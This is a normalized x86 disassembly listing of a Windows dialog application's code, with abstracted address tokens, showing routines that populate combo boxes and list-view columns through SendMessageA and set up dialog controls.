mov edi [ SendMessageA@IAT ]
test eax eax
jne r-xdata
push eax
push eax
push rw-data
call sub_4496b7
lea ecx [ esp + 0x10 ]
call sub_421900
push 0x0
lea ecx [ esp + 0x36c ]
call sub_40c9c0
push rw-data
lea ecx [ esp + 0x10 ]
mov [ esp + 0x48c ] 0x2
call sub_4422d1
mov eax [ esp + 0xc ]
push 0x0
push eax
push 0xffffffff
lea ecx [ esp + 0x374 ]
call sub_42182c
test eax eax
jne r-xdata
mov edx [ esp + 0x120 ]
mov eax [ esi + 0x12c ]
push edx
push 0x0
push 0x143
push eax
call edi
mov edx [ esp + 0x10 ]
push 0x1
push 0x1
lea ecx [ esp + 0x18 ]
call [ edx + 0x14 ]
mov eax [ esp + 0xd8 ]
test eax eax
je r-xdata
mov eax [ esp + 0x430 ]
test eax eax
jne r-xdata
push eax
push eax
push rw-data
call sub_4496b7
lea ecx [ esp + 0x368 ]
call sub_421900
push 0x0
lea ecx [ esp + 0x13c ]
call sub_40d5c0
push rw-data
lea ecx [ esp + 0x10 ]
mov [ esp + 0x48c ] 0x3
call sub_4422d1
mov ecx [ esp + 0xc ]
push 0x0
push ecx
push 0xffffffff
lea ecx [ esp + 0x144 ]
call sub_42182c
test eax eax
jne r-xdata
mov ecx [ esp + 0x47c ]
mov edx [ esi + 0xb4 ]
push ecx
push 0x0
push 0x143
push edx
call edi
mov eax [ esp + 0x368 ]
push 0x1
push 0x1
lea ecx [ esp + 0x370 ]
call [ eax + 0x14 ]
mov eax [ esp + 0x430 ]
test eax eax
je r-xdata
mov eax [ esp + 0x200 ]
test eax eax
jne r-xdata
push eax
push eax
push rw-data
call sub_4496b7
lea ecx [ esp + 0x138 ]
call sub_421900
push 0x0
lea ecx [ esp + 0x254 ]
call sub_40bf00
push rw-data
lea ecx [ esp + 0x10 ]
mov [ esp + 0x48c ] 0x4
call sub_4422d1
mov eax [ esp + 0xc ]
push 0x0
push eax
push 0xffffffff
lea ecx [ esp + 0x25c ]
call sub_42182c
test eax eax
jne r-xdata
mov edx [ esp + 0x24c ]
mov eax [ esi + 0x78 ]
push edx
push 0x0
push 0x143
push eax
call edi
mov edx [ esp + 0x138 ]
push 0x1
push 0x1
lea ecx [ esp + 0x140 ]
call [ edx + 0x14 ]
mov eax [ esp + 0x200 ]
test eax eax
je r-xdata
mov eax [ esp + 0x318 ]
test eax eax
jne r-xdata
push eax
push eax
push rw-data
call sub_4496b7
lea ecx [ esp + 0x250 ]
call sub_421900
push 0xffffffff
push 0xffffffff
lea ebp [ esi + 0x14c ]
push 0x0
push rw-data
push 0x0
mov ecx ebp
call sub_43c126
push 0xffffffff
push 0xffffffff
push 0x0
push rw-data
push 0x1
mov ecx ebp
call sub_43c126
push 0xffffffff
push 0xffffffff
push 0x0
push rw-data
push 0x2
mov ecx ebp
call sub_43c126
push 0xffffffff
push 0xffffffff
push 0x0
push rw-data
push 0x3
mov ecx ebp
call sub_43c126
push 0xffffffff
push 0xffffffff
push 0x0
push rw-data
push 0x4
mov ecx ebp
call sub_43c126
push 0xffffffff
push 0xffffffff
push 0x0
push rw-data
push 0x5
mov ecx ebp
call sub_43c126
push 0xffffffff
push 0xffffffff
push 0x0
push rw-data
push 0x6
mov ecx ebp
call sub_43c126
mov ecx [ esi + 0x168 ]
push 0x3c
push 0x0
push 0x101e
push ecx
call edi
mov edx [ esi + 0x168 ]
push 0x50
push 0x1
push 0x101e
push edx
call edi
mov eax [ esi + 0x168 ]
push 0x50
push 0x2
push 0x101e
push eax
call edi
mov ecx [ esi + 0x168 ]
push 0x64
push 0x3
push 0x101e
push ecx
call edi
mov edx [ esi + 0x168 ]
push 0x50
push 0x4
push 0x101e
push edx
call edi
mov eax [ esi + 0x168 ]
push 0x50
push 0x5
push 0x101e
push eax
call edi
mov ecx [ esi + 0x168 ]
push 0x3c
push 0x6
push 0x101e
push ecx
call edi
mov edx [ esi + 0x168 ]
push 0x21
push 0x0
push 0x1036
push edx
call edi
lea ecx [ esp + 0x364 ]
mov [ esp + 0x488 ] 0x6
call sub_442148
lea ecx [ esp + 0x360 ]
mov [ esp + 0x488 ] 0x5
call sub_442148
lea ecx [ esp + 0x250 ]
mov [ esp + 0x488 ] 0x3
call sub_421723
lea ecx [ esp + 0x24c ]
mov [ esp + 0x488 ] 0x8
call sub_442148
lea ecx [ esp + 0x248 ]
mov [ esp + 0x488 ] 0x7
call sub_442148
lea ecx [ esp + 0x138 ]
mov [ esp + 0x488 ] 0x2
call sub_421723
lea ecx [ esp + 0x47c ]
mov [ esp + 0x488 ] 0x9
call sub_442148
lea ecx [ esp + 0x368 ]
mov [ esp + 0x488 ] 0x1
call sub_421723
lea ecx [ esp + 0x134 ]
mov [ esp + 0x488 ] 0xf
call sub_442148
lea ecx [ esp + 0x130 ]
mov [ esp + 0x488 ] 0xe
call sub_442148
lea ecx [ esp + 0x12c ]
mov [ esp + 0x488 ] 0xd
call sub_442148
lea ecx [ esp + 0x128 ]
mov [ esp + 0x488 ] 0xc
call sub_442148
lea ecx [ esp + 0x124 ]
mov [ esp + 0x488 ] 0xb
call sub_442148
lea ecx [ esp + 0x120 ]
mov [ esp + 0x488 ] 0xa
call sub_442148
lea ecx [ esp + 0x10 ]
mov [ esp + 0x488 ] 0x0
call sub_421723
lea ecx [ esp + 0xc ]
mov [ esp + 0x488 ] 0xffffffff
call sub_442148
pop edi
mov eax 0x1
pop esi
mov ecx [ esp + 0x478 ]
pop ebp
mov [ fs : 0x0 ] ecx
add esp 0x480
retn
mov ecx [ esp + 0x364 ]
mov edx [ esi + 0xf0 ]
push ecx
push 0x0
push 0x143
push edx
call edi
mov eax [ esp + 0x250 ]
push 0x1
push 0x1
lea ecx [ esp + 0x258 ]
call [ eax + 0x14 ]
mov eax [ esp + 0x318 ]
test eax eax
je r-xdata
sub_416c00
push 0xffffffff
push sub_460b2e
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x8c
mov eax [ rw-data ]
push ebx
push ebp
push esi
push edi
mov esi ecx
mov [ esp + 0x10 ] eax
xor edi edi
lea ecx [ esp + 0x34 ]
push edi
mov [ esp + 0xa8 ] edi
mov [ esp + 0x1c ] edi
mov [ esp + 0x18 ] edi
call sub_415e10
push 0x1
mov ecx esi
mov [ esp + 0xa8 ] 0x1
call sub_440b18
mov ecx [ esi + 0x168 ]
push edi
push edi
push 0x1042
push ecx
call [ SendMessageA@IAT ]
mov ebx eax
cmp ebx edi
jge r-xdata
lea ecx [ esp + 0x34 ]
call sub_43de8a
cmp eax 0x1
je r-xdata
lea ecx [ esp + 0x98 ]
mov [ esp + 0xa4 ] 0x3
call sub_442148
mov [ esp + 0xa4 ] 0x2
jmp r-xdata
mov eax [ esp + 0x98 ]
cmp [ eax - 0x8 ] edi
je r-xdata
lea ecx [ esp + 0x98 ]
mov [ esp + 0xa4 ] 0x5
call sub_442148
mov [ esp + 0xa4 ] 0x4
jmp r-xdata
lea ecx [ esp + 0x94 ]
call sub_442148
lea ecx [ esp + 0x34 ]
mov [ esp + 0xa4 ] 0x0
call sub_43da87
lea ecx [ esp + 0x10 ]
mov [ esp + 0xa4 ] 0xffffffff
call sub_442148
mov ecx [ esp + 0x9c ]
pop edi
pop esi
pop ebp
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0x98
retn 0x8
mov eax [ esp + 0x94 ]
cmp [ eax - 0x8 ] edi
je r-xdata
push eax
call sub_42d75a
add esp 0x4
mov [ esp + 0x18 ] eax
lea ebp [ esi + 0x14c ]
push edi
lea edx [ esp + 0x20 ]
push ebx
push edx
mov ecx ebp
call sub_43c1f0
mov eax [ eax ]
lea ecx [ esp + 0x10 ]
push eax
push rw-data
push ecx
mov [ esp + 0xb0 ] 0x6
call sub_43b5cc
add esp 0xc
lea ecx [ esp + 0x1c ]
mov [ esp + 0xa4 ] 0x1
call sub_442148
mov eax [ esp + 0x10 ]
mov edx [ esi + 0x198 ]
lea edi [ esi + 0x198 ]
push 0x0
push eax
push 0xffffffff
mov ecx edi
call [ edx + 0xc ]
test eax eax
jne r-xdata
push eax
call sub_42d75a
add esp 0x4
mov [ esp + 0x14 ] eax
mov edx [ edi ]
mov ecx edi
call [ edx + 0x24 ]
mov eax [ esp + 0x90 ]
test eax eax
je r-xdata
push eax
push rw-data
push rw-data
mov ecx esi
call sub_43fe9c
lea ecx [ esp + 0x98 ]
mov [ esp + 0xa4 ] 0x8
call sub_442148
mov [ esp + 0xa4 ] 0x7
jmp r-xdata
mov ecx [ esp + 0x14 ]
mov eax [ esp + 0x18 ]
mov edx [ edi ]
mov [ esi + 0x2c8 ] ecx
mov ecx edi
mov [ esi + 0x2c4 ] eax
call [ edx + 0x28 ]
mov ecx [ esi + 0x2c4 ]
lea eax [ esp + 0x20 ]
push 0xa
push eax
push ecx
call sub_42d656
add esp 0xc
lea edx [ esp + 0x20 ]
mov ecx ebp
push edx
push 0x4
push ebx
call sub_43c1c5
mov ecx [ esi + 0x2c8 ]
lea eax [ esp + 0x20 ]
push 0xa
push eax
push ecx
call sub_42d656
add esp 0xc
lea edx [ esp + 0x20 ]
mov ecx ebp
push edx
push 0x5
push ebx
call sub_43c1c5
mov esi [ esi + 0x2cc ]
mov ecx ebp
push esi
push 0x6
push ebx
call sub_43c1c5
mov eax [ edi ]
mov ecx edi
call [ eax + 0x10 ]
mov ecx [ esp + 0xb0 ]
mov [ ecx ] 0x0
lea ecx [ esp + 0x98 ]
mov [ esp + 0xa4 ] 0xa
call sub_442148
mov [ esp + 0xa4 ] 0x9
push rw-data
lea ecx [ esi + 0x2cc ]
call sub_4422d1
sub_416ea0
push 0xffffffff
push sub_460ba7
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
mov eax [ esp + 0x14 ]
push ebx
push esi
push edi
mov esi ecx
push eax
push 0x90
mov [ esp + 0x14 ] esi
call sub_43ddd5
lea edi [ esi + 0x5c ]
mov [ esp + 0x18 ] 0x0
mov ecx edi
call sub_43e388
mov [ edi ] r--data
lea edi [ esi + 0x98 ]
mov [ esp + 0x18 ] 0x1
mov ecx edi
call sub_43e388
mov [ edi ] r--data
lea edi [ esi + 0xd4 ]
mov [ esp + 0x18 ] 0x2
mov ecx edi
call sub_43e388
mov [ edi ] r--data
mov ecx [ rw-data ]
lea edi [ esi + 0x110 ]
mov [ edi ] ecx
mov edx [ rw-data ]
lea ebx [ esi + 0x114 ]
mov [ ebx ] edx
push 0x0
lea ecx [ esi + 0x118 ]
mov [ esp + 0x1c ] 0x5
call sub_41e710
push 0x0
lea ecx [ esi + 0x330 ]
mov [ esp + 0x1c ] 0x6
call sub_417770
push rw-data
mov ecx edi
mov [ esp + 0x1c ] 0x7
mov [ esi ] r--data
call sub_4422d1
push rw-data
mov ecx ebx
call sub_4422d1
mov ecx [ esp + 0x10 ]
mov eax esi
pop edi
pop esi
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0x10
retn 0x4
sub_416fb0
push esi
mov esi ecx
push edi
mov edi [ esp + 0xc ]
lea eax [ esi + 0x5c ]
push eax
push 0x41a
push edi
call sub_449556
lea ecx [ esi + 0x98 ]
push ecx
push 0x3e9
push edi
call sub_449556
lea edx [ esi + 0xd4 ]
push edx
push 0x3f6
push edi
call sub_449556
lea eax [ esi + 0x110 ]
push eax
push 0x3f6
push edi
call sub_449495
add esi 0x114
push esi
push 0x3eb
push edi
call sub_4493f1
pop edi
pop esi
retn 0x4
sub_417030
push 0xffffffff
push sub_460c09
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x12c
push ebp
push esi
push edi
mov esi ecx
call sub_43e113
mov eax [ rw-data ]
mov [ esp + 0xc ] eax
push 0x0
lea ecx [ esp + 0x14 ]
mov [ esp + 0x144 ] 0x0
call sub_40a470
push rw-data
lea ecx [ esp + 0x10 ]
mov [ esp + 0x144 ] 0x1
call sub_4422d1
mov ecx [ esp + 0xc ]
push 0x0
push ecx
push 0xffffffff
lea ecx [ esp + 0x1c ]
call sub_42182c
test eax eax
jne r-xdata
mov eax [ esp + 0xd8 ]
mov edi [ SendMessageA@IAT ]
test eax eax
jne r-xdata
push eax
push eax
push rw-data
call sub_4496b7
lea ecx [ esp + 0x10 ]
call sub_421900
push 0xffffffff
push 0xffffffff
lea ebp [ esi + 0x98 ]
push 0x0
push rw-data
push 0x0
mov ecx ebp
call sub_43c126
push 0xffffffff
push 0xffffffff
push 0x0
push rw-data
push 0x1
mov ecx ebp
call sub_43c126
mov eax [ esi + 0xb4 ]
push 0x3c
push 0x0
push 0x101e
push eax
call edi
mov ecx [ esi + 0xb4 ]
push 0x50
push 0x1
push 0x101e
push ecx
call edi
mov edx [ esi + 0xb4 ]
push 0x21
push 0x0
push 0x1036
push edx
call edi
push 0xffffffff
push 0xffffffff
lea ebp [ esi + 0x5c ]
push 0x0
push rw-data
push 0x0
mov ecx ebp
call sub_43c126
push 0xffffffff
push 0xffffffff
push 0x0
push rw-data
push 0x1
mov ecx ebp
call sub_43c126
push 0xffffffff
push 0xffffffff
push 0x0
push rw-data
push 0x2
mov ecx ebp
call sub_43c126
push 0xffffffff
push 0xffffffff
push 0x0
push rw-data
push 0x3
mov ecx ebp
call sub_43c126
push 0xffffffff
push 0xffffffff
push 0x0
push rw-data
push 0x4
mov ecx ebp
call sub_43c126
mov eax [ esi + 0x78 ]
push 0x64
push 0x0
push 0x101e
push eax
call edi
mov ecx [ esi + 0x78 ]
push 0x50
push 0x1
push 0x101e
push ecx
call edi
mov edx [ esi + 0x78 ]
push 0x50
push 0x2
push 0x101e
push edx
call edi
mov eax [ esi + 0x78 ]
push 0x50
push 0x3
push 0x101e
push eax
call edi
mov ecx [ esi + 0x78 ]
push 0x50
push 0x4
push 0x101e
push ecx
call edi
mov edx [ esi + 0x78 ]
push 0x21
push 0x0
push 0x1036
push edx
call edi
lea ecx [ esp + 0x134 ]
mov [ esp + 0x140 ] 0x7
call sub_442148
lea ecx [ esp + 0x130 ]
mov [ esp + 0x140 ] 0x6
call sub_442148
lea ecx [ esp + 0x12c ]
mov [ esp + 0x140 ] 0x5
call sub_442148
lea ecx [ esp + 0x128 ]
mov [ esp + 0x140 ] 0x4
call sub_442148
lea ecx [ esp + 0x124 ]
mov [ esp + 0x140 ] 0x3
call sub_442148
lea ecx [ esp + 0x120 ]
mov [ esp + 0x140 ] 0x2
call sub_442148
lea ecx [ esp + 0x10 ]
mov [ esp + 0x140 ] 0x0
call sub_421723
lea ecx [ esp + 0xc ]
mov [ esp + 0x140 ] 0xffffffff
call sub_442148
mov ecx [ esp + 0x138 ]
pop edi
pop esi
mov eax 0x1
pop ebp
mov [ fs : 0x0 ] ecx
add esp 0x138
retn
mov edx [ esp + 0x120 ]
mov eax [ esi + 0xf0 ]
push edx
push 0x0
push 0x143
push eax
call edi
mov edx [ esp + 0x10 ]
push 0x1
push 0x1
lea ecx [ esp + 0x18 ]
call [ edx + 0x14 ]
mov eax [ esp + 0xd8 ]
test eax eax
je r-xdata
sub_4172e0
push 0xffffffff
push sub_460c28
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push ebx
push ebp
push esi
push edi
mov esi ecx
push 0x1
call sub_440b18
mov eax [ esi + 0x110 ]
xor ebx ebx
cmp [ eax - 0x8 ] ebx
jne r-xdata
mov ecx [ rw-data ]
mov [ esp + 0x10 ] ecx
mov edx [ esi + 0xb4 ]
mov ebp [ SendMessageA@IAT ]
push ebx
push ebx
push 0x1009
push edx
mov [ esp + 0x2c ] ebx
call ebp
mov eax [ esi + 0xb4 ]
push ebx
push ebx
push 0xb
push eax
call ebp
push 0x1
mov ecx esi
call sub_440b18
mov ecx [ esi + 0x110 ]
lea edx [ esp + 0x10 ]
push ecx
push rw-data
push edx
call sub_43b5cc
mov ecx [ esp + 0x1c ]
mov eax [ esi + 0x118 ]
add esp 0xc
lea edi [ esi + 0x118 ]
push ebx
push ecx
push 0xffffffff
mov ecx edi
call [ eax + 0xc ]
test eax eax
jne r-xdata
push ebx
push ebx
push rw-data
call sub_4496b7
pop edi
pop esi
pop ebp
pop ebx
mov ecx [ esp + 0x4 ]
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
cmp [ esi + 0x1e0 ] ebx
jne r-xdata
push ebx
push rw-data
push rw-data
mov ecx esi
call sub_43fe9c
jmp r-xdata
mov eax [ edi ]
mov ecx edi
call [ eax + 0x10 ]
mov ecx [ esi + 0xb4 ]
push 0x0
push 0x1
push 0xb
push ecx
call ebp
lea ebp [ esi + 0x98 ]
lea ecx [ esp + 0x10 ]
mov [ esp + 0x1c ] 0xffffffff
call sub_442148
mov ecx [ esp + 0x14 ]
pop edi
pop esi
pop ebp
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
mov eax [ esi + 0x228 ]
push 0x0
push 0x0
push 0x0
push 0x0
push eax
push ebx
push 0x1
mov ecx ebp
call sub_43c179
mov eax [ esi + 0x22c ]
mov ecx ebp
push eax
push 0x1
push ebx
call sub_43c1c5
mov edx [ edi ]
push 0x1
push 0x1
mov ecx edi
inc ebx
call [ edx + 0x14 ]
mov eax [ esi + 0x1e0 ]
test eax eax
je r-xdata
mov ebp [ SendMessageA@IAT ]
sub_417450
mov eax [ fs : 0x0 ]
push 0xffffffff
push sub_460c48
push eax
mov [ fs : 0x0 ] esp
sub esp 0x8
push esi
mov esi ecx
push 0x1
call sub_440b18
mov eax [ esi + 0x114 ]
mov ecx [ eax - 0x8 ]
test ecx ecx
jne r-xdata
mov ecx [ rw-data ]
mov [ esp + 0x4 ] ecx
mov edx [ esi + 0x114 ]
lea eax [ esp + 0x4 ]
push edx
push rw-data
push eax
mov [ esp + 0x20 ] 0x0
call sub_43b5cc
add esp 0x8
lea edx [ esp + 0x8 ]
mov ecx esp
mov [ esp + 0xc ] esp
push edx
call sub_441ebd
mov ecx esi
call sub_4175d0
lea ecx [ esp + 0x4 ]
mov [ esp + 0x14 ] 0xffffffff
call sub_442148
mov ecx [ esp + 0xc ]
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x14
retn
push 0x0
push 0x0
push rw-data
call sub_4496b7
mov ecx [ esp + 0xc ]
mov [ fs : 0x0 ] ecx
pop esi
add esp 0x14
retn
sub_417500
push 0xffffffff
push sub_460c70
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0xc
mov eax [ rw-data ]
push esi
mov esi ecx
mov [ esp + 0x4 ] eax
push 0x1
mov [ esp + 0x1c ] 0x0
call sub_440b18
mov ecx [ esi + 0xb4 ]
push 0x0
push 0x0
push 0x1042
push ecx
call [ SendMessageA@IAT ]
push 0x0
lea edx [ esp + 0xc ]
push eax
push edx
lea ecx [ esi + 0x98 ]
call sub_43c1f0
mov eax [ eax ]
lea ecx [ esp + 0x4 ]
push eax
push rw-data
push ecx
mov [ esp + 0x24 ] 0x1
call sub_43b5cc
add esp 0xc
lea ecx [ esp + 0x8 ]
mov [ esp + 0x18 ] 0x0
call sub_442148
push ecx
lea edx [ esp + 0x8 ]
mov ecx esp
mov [ esp + 0x10 ] esp
push edx
call sub_441ebd
mov ecx esi
call sub_4175d0
mov eax [ esp + 0x24 ]
lea ecx [ esp + 0x4 ]
mov [ esp + 0x18 ] 0xffffffff
mov [ eax ] 0x0
call sub_442148
mov ecx [ esp + 0x10 ]
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x18
retn 0x8
sub_4175d0
push 0xffffffff
push sub_460c88
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x14
push ebx
push ebp
push esi
push edi
mov esi ecx
mov eax [ esi + 0x78 ]
mov ebx [ SendMessageA@IAT ]
xor edi edi
push edi
push edi
push 0x1009
push eax
mov [ esp + 0x3c ] edi
call ebx
mov ecx [ esi + 0x78 ]
push edi
push edi
push 0xb
push ecx
call ebx
push 0x1
mov ecx esi
call sub_440b18
mov eax [ esp + 0x34 ]
mov edx [ esi + 0x330 ]
lea ebp [ esi + 0x330 ]
push edi
push eax
push 0xffffffff
mov ecx ebp
call [ edx + 0xc ]
test eax eax
jne r-xdata
cmp [ esi + 0x3f8 ] edi
jne r-xdata
push edi
push rw-data
push rw-data
mov ecx esi
call sub_43fe9c
jmp r-xdata
mov edx [ ebp ]
mov ecx ebp
call [ edx + 0x10 ]
mov eax [ esi + 0x78 ]
push 0x0
push 0x1
push 0xb
push eax
call ebx
lea ebx [ esi + 0x5c ]
lea ecx [ esp + 0x34 ]
mov [ esp + 0x2c ] 0xffffffff
call sub_442148
mov ecx [ esp + 0x24 ]
pop edi
pop esi
pop ebp
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0x20
retn 0x4
mov edx [ esi + 0x440 ]
lea ecx [ esp + 0x10 ]
push 0xa
push ecx
push edx
call sub_42d656
mov eax [ esi + 0x448 ]
add esp 0xc
mov ecx ebx
push 0x0
push 0x0
push 0x0
push 0x0
push eax
push edi
push 0x1
call sub_43c179
mov eax [ esi + 0x454 ]
mov ecx ebx
push eax
push 0x1
push edi
call sub_43c1c5
mov eax [ esi + 0x458 ]
mov ecx ebx
push eax
push 0x2
push edi
call sub_43c1c5
mov ecx [ esi + 0x45c ]
lea eax [ esp + 0x10 ]
push 0xa
push eax
push ecx
call sub_42d656
add esp 0xc
lea edx [ esp + 0x10 ]
mov ecx ebx
push edx
push 0x3
push edi
call sub_43c1c5
mov ecx [ esi + 0x460 ]
lea eax [ esp + 0x10 ]
push 0xa
push eax
push ecx
call sub_42d656
add esp 0xc
lea edx [ esp + 0x10 ]
mov ecx ebx
push edx
push 0x4
push edi
call sub_43c1c5
mov eax [ ebp ]
push 0x1
push 0x1
mov ecx ebp
inc edi
call [ eax + 0x14 ]
mov eax [ esi + 0x3f8 ]
test eax eax
je r-xdata
mov ebx [ SendMessageA@IAT ]
sub_417770
push 0xffffffff
push sub_460d0a
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
mov eax [ esp + 0x14 ]
push ebx
push ebp
push esi
push edi
mov esi ecx
push eax
mov [ esp + 0x14 ] esi
call sub_421517
mov edx [ rw-data ]
lea ecx [ esi + 0x114 ]
mov [ esp + 0x1c ] 0x0
mov [ ecx ] edx
mov eax [ rw-data ]
lea edi [ esi + 0x118 ]
mov [ edi ] eax
mov edx [ rw-data ]
lea ebx [ esi + 0x11c ]
mov [ ebx ] edx
mov eax [ rw-data ]
lea ebp [ esi + 0x120 ]
mov [ ebp ] eax
mov edx [ rw-data ]
mov [ esi + 0x124 ] edx
mov eax [ rw-data ]
mov [ esi + 0x128 ] eax
mov edx [ rw-data ]
mov [ esi + 0x134 ] edx
push rw-data
mov [ esp + 0x20 ] 0x7
mov [ esi ] r--data
mov [ esi + 0x110 ] 0x0
call sub_4422d1
push rw-data
mov ecx edi
call sub_4422d1
push rw-data
mov ecx ebx
call sub_4422d1
push rw-data
mov ecx ebp
call sub_4422d1
push rw-data
lea ecx [ esi + 0x124 ]
call sub_4422d1
push rw-data
lea ecx [ esi + 0x128 ]
call sub_4422d1
xor eax eax
push rw-data
lea ecx [ esi + 0x134 ]
mov [ esi + 0x12c ] eax
mov [ esi + 0x130 ] eax
call sub_4422d1
mov ecx [ esp + 0x14 ]
mov [ esi + 0x14 ] 0xa
mov [ esi + 0x8c ] 0x1
mov eax esi
pop edi
pop esi
pop ebp
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0x10
retn 0x4
sub_417900
push esi
mov esi ecx
push edi
mov edi [ esp + 0xc ]
lea eax [ esi + 0x110 ]
push eax
push rw-data
push edi
mov [ edi + 0x8 ] 0x0
call sub_424ab5
push 0x0
push 0xc
lea ecx [ esi + 0x114 ]
push 0xff
push ecx
push rw-data
push edi
call sub_4246fa
push 0x0
push 0xc
lea edx [ esi + 0x118 ]
push 0xff
push edx
push rw-data
push edi
call sub_4246fa
push 0x0
push 0xc
lea eax [ esi + 0x11c ]
push 0xff
push eax
push rw-data
push edi
call sub_4246fa
push 0x0
push 0xc
lea ecx [ esi + 0x120 ]
push 0xff
push ecx
push rw-data
push edi
call sub_4246fa
push 0x0
push 0xc
lea edx [ esi + 0x124 ]
push 0xff
push edx
push rw-data
push edi
call sub_4246fa
push 0x0
push 0xc
lea eax [ esi + 0x128 ]
push 0xff
push eax
push rw-data
push edi
call sub_4246fa
lea ecx [ esi + 0x12c ]
push ecx
push rw-data
push edi
call sub_424ab5
lea edx [ esi + 0x130 ]
push edx
push rw-data
push edi
call sub_424ab5
push 0x0
push 0xc
add esi 0x134
push 0xff
push esi
push rw-data
push edi
call sub_4246fa
pop edi
pop esi
retn 0x4
sub_417a10
push 0xffffffff
push sub_460db1
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
mov eax [ esp + 0x14 ]
push ebx
push ebp
push esi
push edi
mov esi ecx
push eax
push 0x94
mov [ esp + 0x18 ] esi
call sub_43ddd5
lea edi [ esi + 0x5c ]
mov [ esp + 0x1c ] 0x0
mov ecx edi
call sub_43e388
mov [ edi ] r--data
lea edi [ esi + 0x98 ]
mov [ esp + 0x1c ] 0x1
mov ecx edi
call sub_43e388
mov [ edi ] r--data
lea edi [ esi + 0xd4 ]
mov [ esp + 0x1c ] 0x2
mov ecx edi
call sub_43e388
mov [ edi ] r--data
lea edi [ esi + 0x110 ]
mov [ esp + 0x1c ] 0x3
mov ecx edi
call sub_43e388
mov [ edi ] r--data
lea edi [ esi + 0x14c ]
mov [ esp + 0x1c ] 0x4
mov ecx edi
call sub_43e388
mov [ edi ] r--data
mov ecx [ rw-data ]
lea edi [ esi + 0x188 ]
mov [ edi ] ecx
mov edx [ rw-data ]
lea ebx [ esi + 0x18c ]
mov [ ebx ] edx
mov eax [ rw-data ]
lea ebp [ esi + 0x190 ]
mov [ ebp ] eax
mov ecx [ rw-data ]
mov [ esi + 0x194 ] ecx
push 0x0
lea ecx [ esi + 0x198 ]
mov [ esp + 0x20 ] 0x9
call sub_417770
push rw-data
mov ecx edi
mov [ esp + 0x20 ] 0xa
mov [ esi ] r--data
call sub_4422d1
push rw-data
mov ecx ebx
call sub_4422d1
push rw-data
mov ecx ebp
call sub_4422d1
push rw-data
lea ecx [ esi + 0x194 ]
call sub_4422d1
mov ecx [ esp + 0x14 ]
mov eax esi
pop edi
pop esi
pop ebp
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0x10
retn 0x4
sub_417b80
push esi
mov esi ecx
push edi
mov edi [ esp + 0xc ]
lea eax [ esi + 0x5c ]
push eax
push 0x41a
push edi
call sub_449556
lea ecx [ esi + 0x98 ]
push ecx
push 0x416
push edi
call sub_449556
lea edx [ esi + 0xd4 ]
push edx
push 0x3ea
push edi
call sub_449556
lea eax [ esi + 0x110 ]
push eax
push 0x3eb
push edi
call sub_449556
lea ecx [ esi + 0x14c ]
push ecx
push 0x3f6
push edi
call sub_449556
lea edx [ esi + 0x188 ]
push edx
push 0x3f6
push edi
call sub_449495
lea eax [ esi + 0x18c ]
push eax
push 0x3eb
push edi
call sub_449495
lea ecx [ esi + 0x190 ]
push ecx
push 0x3ea
push edi
call sub_449495
add esi 0x194
push esi
push 0x416
push edi
call sub_449495
pop edi
pop esi
retn 0x4
sub_417c40
push 0xffffffff
push sub_460e70
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x474
push ebp
push esi
push edi
mov esi ecx
call sub_43e113
mov eax [ rw-data ]
mov [ esp + 0xc ] eax
push 0x0
lea ecx [ esp + 0x14 ]
mov [ esp + 0x48c ] 0x0
call sub_40a470
push rw-data
lea ecx [ esp + 0x10 ]
mov [ esp + 0x48c ] 0x1
call sub_4422d1
mov ecx [ esp + 0xc ]
push 0x0
push ecx
push 0xffffffff
lea ecx [ esp + 0x1c ]
call sub_42182c
test eax eax
jne r-xdata
mov eax [ esp + 0xd8 ]
mov edi [ SendMessageA@IAT ]
test eax eax
jne r-xdata
push eax
push eax
push rw-data
call sub_4496b7
lea ecx [ esp + 0x10 ]
call sub_421900
push 0x0
lea ecx [ esp + 0x36c ]
call sub_40c9c0
push rw-data
lea ecx [ esp + 0x10 ]
mov [ esp + 0x48c ] 0x2
call sub_4422d1
mov eax [ esp + 0xc ]
push 0x0
push eax
push 0xffffffff
lea ecx [ esp + 0x374 ]
call sub_42182c
test eax eax
jne r-xdata
mov edx [ esp + 0x120 ]
mov eax [ esi + 0x168 ]
push edx
push 0x0
push 0x143
push eax
call edi
mov edx [ esp + 0x10 ]
push 0x1
push 0x1
lea ecx [ esp + 0x18 ]
call [ edx + 0x14 ]
mov eax [ esp + 0xd8 ]
test eax eax
je r-xdata
mov eax [ esp + 0x430 ]
test eax eax
jne r-xdata
push eax
push eax
push rw-data
call sub_4496b7
lea ecx [ esp + 0x368 ]
call sub_421900
push 0x0
lea ecx [ esp + 0x13c ]
call sub_40d5c0
push rw-data
lea ecx [ esp + 0x10 ]
mov [ esp + 0x48c ] 0x3
call sub_4422d1
mov ecx [ esp + 0xc ]
push 0x0
push ecx
push 0xffffffff
lea ecx [ esp + 0x144 ]
call sub_42182c
test eax eax
jne r-xdata
mov ecx [ esp + 0x47c ]
mov edx [ esi + 0xf0 ]
push ecx
push 0x0
push 0x143
push edx
call edi
mov eax [ esp + 0x368 ]
push 0x1
push 0x1
lea ecx [ esp + 0x370 ]
call [ eax + 0x14 ]
mov eax [ esp + 0x430 ]
test eax eax
je r-xdata
mov eax [ esp + 0x200 ]
test eax eax
jne r-xdata
push eax
push eax
push rw-data
call sub_4496b7
lea ecx [ esp + 0x138 ]
call sub_421900
push 0x0
lea ecx [ esp + 0x254 ]
call sub_40bf00
push rw-data
lea ecx [ esp + 0x10 ]
mov [ esp + 0x48c ] 0x4
